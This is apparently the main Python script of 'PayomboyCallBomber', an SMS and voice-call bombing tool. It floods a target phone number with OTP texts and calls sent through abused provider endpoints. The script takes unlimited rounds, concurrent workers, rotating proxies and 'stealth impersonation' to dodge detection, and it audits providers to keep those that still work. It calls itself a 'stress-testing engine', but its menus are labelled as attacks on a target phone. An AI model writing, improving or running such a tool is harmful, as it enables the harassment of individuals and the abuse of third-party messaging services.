import os
import sys
import signal
import asyncio
import argparse
from typing import Optional, List

# Ensure project root is in sys.path
sys.path.insert(0, os.path.abspath(os.path.dirname(__file__)))

# Windows UTF-8 console fix
if sys.platform == "win32":
    try:
        os.system("chcp 65001 > nul 2>&1")
        if hasattr(sys.stdout, "reconfigure"):
            sys.stdout.reconfigure(encoding="utf-8", errors="replace")
        if hasattr(sys.stderr, "reconfigure"):
            sys.stderr.reconfigure(encoding="utf-8", errors="replace")
    except Exception:
        pass

from core.phone import PhoneNumber
from core.provider import ProviderLoader, Provider
from core.proxy import ProxyManager
from core.engine import AttackEngine
from core.exporter import ProviderExporter
from ui.banner import print_banner, console
from ui.dashboard import Dashboard

PROVIDERS_FILE = os.path.join(os.path.dirname(__file__), "config", "providers.json")
VERIFIED_FILE = os.path.join(os.path.dirname(__file__), "config", "verified_providers.json")
PROXIES_FILE = os.path.join(os.path.dirname(__file__), "proxies.txt")

async def run_audit(providers: List[Provider], test_target: str = "0812345678", export_verified: bool = False, stealth: bool = True):
    console.print("\n[bold yellow]🔍 Starting Provider Health Audit Mode (Stealth Engine: " + ("ON" if stealth else "OFF") + ")...[/bold yellow]")
    phone = PhoneNumber(test_target)
    dash = Dashboard(phone.formatted_local, "AUDIT", len(providers))
    dash.print_target_info(concurrency=3, rounds=1, proxy_count=0)

    successful_providers = []

    def on_audit_result(provider: Provider, success: bool, status_code: int, latency_ms: float, error_msg: Optional[str]):
        dash.log_result(provider, success, status_code, latency_ms, error_msg)
        if success:
            successful_providers.append(provider.name)

    engine = AttackEngine(
        providers=providers,
        phone=phone,
        mode="all",
        max_concurrency=3,
        on_result=on_audit_result,
        use_stealth=stealth
    )
    
    await engine.run(rounds=1, delay_between_rounds=0)
    dash.print_summary(engine.stats)

    if export_verified and successful_providers:
        ProviderExporter.export_verified(providers, successful_providers, VERIFIED_FILE)
        console.print(f"[bold green]✓ Exported {len(successful_providers)} verified providers to {VERIFIED_FILE}[/bold green]\n")

    return successful_providers

async def run_attack(
    target: str,
    mode: str = "all",
    rounds: int = 1,
    concurrency: int = 5,
    proxy_path: Optional[str] = None,
    providers_path: Optional[str] = None,
    stealth: bool = True
):
    phone = PhoneNumber(target)
    active_providers_file = providers_path or PROVIDERS_FILE
    providers = ProviderLoader.load(active_providers_file)
    proxy_mgr = ProxyManager(proxy_path or PROXIES_FILE)

    dash = Dashboard(phone.formatted_local, mode, len(providers))
    dash.print_target_info(concurrency=concurrency, rounds=rounds, proxy_count=proxy_mgr.count)

    engine = AttackEngine(
        providers=providers,
        phone=phone,
        mode=mode,
        max_concurrency=concurrency,
        proxy_manager=proxy_mgr,
        on_result=dash.log_result,
        use_stealth=stealth
    )

    loop = asyncio.get_running_loop()

    def handle_sigint():
        console.print("\n[bold red][!] Interrupted by user. Shutting down gracefully...[/bold red]")
        engine.stop()

    if sys.platform != "win32":
        loop.add_signal_handler(signal.SIGINT, handle_sigint)

    try:
        await engine.run(rounds=rounds, delay_between_rounds=1.5)
    except KeyboardInterrupt:
        engine.stop()
    finally:
        dash.print_summary(engine.stats)


def interactive_menu():
    print_banner()
    
    has_verified = os.path.exists(VERIFIED_FILE)
    default_file = VERIFIED_FILE if has_verified else PROVIDERS_FILE
    providers = ProviderLoader.load(default_file)
    call_count = len([p for p in providers if p.type == "call"])
    sms_count = len([p for p in providers if p.type == "sms"])

    file_label = "[bold green]VERIFIED POOL[/bold green]" if has_verified else "[bold yellow]FULL POOL[/bold yellow]"
    console.print(f"Active Provider Source: {file_label} • [bold white]Loaded:[/] [bold yellow]{len(providers)}[/] ([bold yellow]{call_count} Voice Call[/] • [bold cyan]{sms_count} SMS OTP[/])\n")
    
    console.print("[bold green]1.[/] Start Call & SMS Attack (Stealth Impersonation)")
    console.print("[bold green]2.[/] Start Voice Call Only Attack")
    console.print("[bold green]3.[/] Start SMS Only Attack")
    console.print("[bold green]4.[/] Health Audit & Prune Providers (Auto-update Verified Pool)")
    console.print("[bold green]5.[/] View Loaded Provider Endpoints")
    console.print("[bold green]6.[/] Switch Provider List (Full vs Verified)")
    console.print("[bold red]0.[/] Exit\n")

    choice = console.input("[bold cyan]Select option > [/bold cyan]").strip()

    if choice == "0":
        console.print("[yellow]Bye.[/yellow]")
        sys.exit(0)

    elif choice in ("1", "2", "3"):
        mode_map = {"1": "all", "2": "call", "3": "sms"}
        mode = mode_map[choice]

        target = console.input("\n[bold cyan]Target Phone (e.g. 0812345678) > [/bold cyan]").strip()
        if not target:
            console.print("[red]Target phone cannot be empty![/red]")
            return

        rounds_in = console.input("[bold cyan]Rounds (Enter for 1, 0 for infinite) [1] > [/bold cyan]").strip()
        rounds = int(rounds_in) if rounds_in.isdigit() else 1

        threads_in = console.input("[bold cyan]Concurrency Threads [5] > [/bold cyan]").strip()
        concurrency = int(threads_in) if threads_in.isdigit() else 5

        console.print()
        asyncio.run(run_attack(target, mode=mode, rounds=rounds, concurrency=concurrency, providers_path=default_file))

    elif choice == "4":
        test_phone = console.input("\n[bold cyan]Test Phone for Audit [0812345678] > [/bold cyan]").strip() or "0812345678"
        all_providers = ProviderLoader.load(PROVIDERS_FILE)
        asyncio.run(run_audit(all_providers, test_target=test_phone, export_verified=True))
        input("Press Enter to return to menu...")
        interactive_menu()

    elif choice == "5":
        console.print("\n[bold yellow]Registered Providers:[/bold yellow]")
        for idx, p in enumerate(providers, 1):
            badge = "[yellow]CALL[/yellow]" if p.type == "call" else "[cyan]SMS [/cyan]"
            console.print(f" {idx:>2}. {badge} [bold white]{p.name:<25}[/bold white] -> {p.url_template[:45]}...")
        console.print()
        input("Press Enter to continue...")
        interactive_menu()

    elif choice == "6":
        if os.path.exists(VERIFIED_FILE):
            os.remove(VERIFIED_FILE)
            console.print("[yellow]Switched to FULL POOL (providers.json)[/yellow]")
        else:
            console.print("[yellow]No verified pool found yet. Run Option 4 (Audit) first.[/yellow]")
        input("Press Enter to continue...")
        interactive_menu()
    else:
        console.print("[red]Invalid selection![/red]")


def main():
    parser = argparse.ArgumentParser(description="PayomboyCallBomber - Asynchronous Stress-Testing Engine")
    parser.add_argument("-t", "--target", type=str, help="Target phone number (e.g. 0812345678)")
    parser.add_argument("-m", "--mode", choices=["all", "call", "sms"], default="all", help="Attack mode (default: all)")
    parser.add_argument("-r", "--rounds", type=int, default=1, help="Rounds to execute (0 for infinite, default: 1)")
    parser.add_argument("-c", "--concurrency", type=int, default=5, help="Concurrent workers (default: 5)")
    parser.add_argument("-p", "--proxy-file", type=str, help="Path to custom proxy file")
    parser.add_argument("--providers", type=str, help="Path to custom providers JSON file")
    parser.add_argument("--audit", action="store_true", help="Audit provider health against a dummy target")
    parser.add_argument("--export-verified", action="store_true", help="Auto export active endpoints after audit")
    parser.add_argument("--standard-engine", action="store_true", help="Disable curl_cffi stealth and use standard httpx")

    args = parser.parse_args()
    use_stealth = not args.standard_engine

    if args.audit:
        print_banner()
        providers = ProviderLoader.load(args.providers or PROVIDERS_FILE)
        asyncio.run(run_audit(
            providers,
            test_target=args.target or "0812345678",
            export_verified=args.export_verified,
            stealth=use_stealth
        ))
    elif args.target:
        print_banner()
        asyncio.run(run_attack(
            target=args.target,
            mode=args.mode,
            rounds=args.rounds,
            concurrency=args.concurrency,
            proxy_path=args.proxy_file,
            providers_path=args.providers,
            stealth=use_stealth
        ))
    else:
        try:
            interactive_menu()
        except KeyboardInterrupt:
            console.print("\n[yellow]Exited.[/yellow]")

if __name__ == "__main__":
    main()
